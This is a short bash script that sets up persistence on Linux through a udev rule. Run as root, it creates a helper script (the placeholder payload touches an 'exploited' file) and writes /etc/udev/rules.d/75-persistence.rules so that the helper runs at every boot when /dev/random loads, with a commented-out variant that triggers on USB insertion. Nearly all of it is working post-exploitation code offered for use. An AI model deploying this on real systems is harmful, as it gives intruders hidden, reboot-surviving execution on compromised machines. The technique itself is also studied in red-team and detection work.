#!/bin/bash
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 
   exit 1
fi

# Don't write to tmp because it will not survive reboot
# Change to valid path before running
echo "touch /home/graham/exploited" > /home/graham/udev.sh
chmod +x /home/graham/udev.sh

# Add when a USB device is plugged in (which may not be done often, or may be done way too much)
# echo 'SUBSYSTEMS=="usb", RUN+="/bin/sh -c '/tmp/udev.sh'"' > /etc/udev/rules.d/75-persistence.rules

# Run when /dev/random is loaded, which is done at reboot
# Make sure to change /home/graham to something valid on the system
echo 'ACTION=="add", ENV{MAJOR}=="1", ENV{MINOR}=="8", RUN+="/bin/sh -c '/home/graham/udev.sh'"' > /etc/udev/rules.d/75-persistence.rules
